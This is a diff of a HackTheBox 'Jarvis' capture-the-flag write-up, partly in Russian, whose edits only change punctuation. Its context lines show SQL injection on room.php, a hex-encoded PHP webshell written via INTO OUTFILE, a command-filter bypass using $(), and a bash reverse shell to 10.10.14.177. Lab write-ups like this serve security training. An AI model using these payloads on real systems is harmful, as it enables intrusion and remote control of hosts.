@@ -1,4 +1,4 @@
-JARVIS (HTB) — ATTACK CHAIN
+﻿JARVIS (HTB) - ATTACK CHAIN
 
 Reconnaissance
 ├── nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n → 22 (SSH), 80 (Apache "Stark Hotel"), 64999 (Apache + fail2ban)
@@ -24,7 +24,7 @@ Foothold (RCE via INTO OUTFILE)
 Lateral Movement (www-data → pepper)
 ├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ├── cat simpler.py → exec_ping(): forbidden = ['&', ';', '-', '`', '||', '|']
-├── Обход через $() — command substitution не заблокирован
+├── Обход через $() - command substitution не заблокирован
 ├── /tmp/shell.sh: bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
 └── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh) → shell pepper
 
@@ -48,14 +48,14 @@ nmap -sC -sV -Pn -n --open -p 22,80,64999 10.129.229.137 -oA scans/detail
 
 Открытые порты:
 - 22/tcp    OpenSSH 7.4p1 Debian 10+deb9u6
-- 80/tcp    Apache httpd 2.4.25 (Debian) — title "Stark Hotel"
-- 64999/tcp Apache httpd 2.4.25 (Debian) — "Hey you have been banned for 90 seconds"
+- 80/tcp    Apache httpd 2.4.25 (Debian) - title "Stark Hotel"
+- 64999/tcp Apache httpd 2.4.25 (Debian) - "Hey you have been banned for 90 seconds"
 
-Порт 64999 защищён fail2ban — не трогаем, чтобы не забанить IP.
+Порт 64999 защищён fail2ban - не трогаем, чтобы не забанить IP.
 
 NSE-скрипты нашли:
 - /phpmyadmin/ (phpMyAdmin)
-- /images/, /js/, /css/, /fonts/ — листинги директорий
+- /images/, /js/, /css/, /fonts/ - листинги директорий
 - http-internal-ip-disclosure: 127.0.0.1
 
 Gobuster на 80:
@@ -124,14 +124,14 @@ curl -s -G "http://jarvis.htb/room.php" \
   --data-urlencode "cod=-1 UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7-- -"
 # DocumentRoot /var/www/html
 
-Проверяем, что можем писать файлы — записываем тестовый PHP:
+Проверяем, что можем писать файлы - записываем тестовый PHP:
 curl -s -G "http://jarvis.htb/room.php" \
   --data-urlencode "cod=-1 UNION SELECT 0x3c3f706870206563686f202848656c6c6f576f726c64293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/test.php'-- -"
 
 curl "http://jarvis.htb/test.php"
 # HelloWorld    2    3    4    5    6    7
 
-Записываем webshell — hex от <?php system($_GET['x']); ?>:
+Записываем webshell - hex от <?php system($_GET['x']); ?>:
 curl -s -G "http://jarvis.htb/room.php" \
   --data-urlencode "cod=-1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/x.php'-- -"
 
@@ -178,7 +178,7 @@ def exec_ping():
 
 Фильтр не блокирует $, (, ). Используем command substitution.
 
-Создаём /tmp/shell.sh (важно — двойные кавычки внутри bash -c, потому что os.system вызывает sh → dash, а dash не понимает >&):
+Создаём /tmp/shell.sh (важно - двойные кавычки внутри bash -c, потому что os.system вызывает sh → dash, а dash не понимает >&):
 echo 'bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"' > /tmp/shell.sh
 chmod +x /tmp/shell.sh
 cat /tmp/shell.sh
